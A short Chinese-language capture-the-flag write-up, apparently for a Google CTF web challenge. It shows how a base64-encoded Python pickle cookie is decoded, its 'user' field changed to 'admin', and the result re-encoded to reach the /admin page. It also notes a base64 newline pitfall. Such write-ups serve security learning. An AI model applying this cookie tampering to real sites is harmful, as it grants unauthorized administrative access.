##题目描述
---

[This](https://ssl-added-and-removed-here.ctfcompetition.com:9447) blog on Zombie research looks like it might be interesting - can you break into the /admin section?


##题解

此题和[Ernst Echidna](../Ernst Echidna)类似。进去发现`Cookie`:

> "obsoletePickle=KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu"

使用python解base64 (Javascript也可以用atob/btoa)
```python
In [1]: a.decode('base64')
Out[2]: "(dp1\nS'python'\np2\nS'pickles'\np3\nsS'subtle'\np4\nS'hint'\np5\nsS'user'\np6\nNs."
```

发现着来自python pickles包，

```python
In [2]: import pickle

In [3]: a = a.decode('base64')

In [4]: pickle.loads(a)
Out[4]: {'python': 'pickles', 'subtle': 'hint', 'user': None}
```

此处user为none,对应网站上说`err=user_not_found`就有依据了，尝试修改user为admin:

```
In [5]: t = pickle.loads(a)

In [6]: t['user'] = 'admin'

In [7]: pickle.dumps(t)
Out[7]: "(dp0\nS'python'\np1\nS'pickles'\np2\nsS'subtle'\np3\nS'hint'\np4\nsS'user'\np5\nS'admin'\np6\ns."
In [8]: import base64

In [9]: base64.b64encode(pickle.dumps(t))
KGRwMApTJ3B5dGhvbicKcDEKUydwaWNrbGVzJwpwMgpzUydzdWJ0bGUnCnAzClMnaGludCcKcDQKc1MndXNlcicKcDUKUydhZG1pbicKcDYKcy4=
```

得Flag
> Your flag is CTF{but_wait,theres_more.if_you_call} ... but is there more(1)? or less(1)?


###坑

我习惯了用python自带的encode/deocde方法，发现在直接调用a.encode('base64')的时候换行符会忽略，然后导致base64是错误的（我开始用了urlencode之类的方式都无果）后来移除了`\n`搞定。








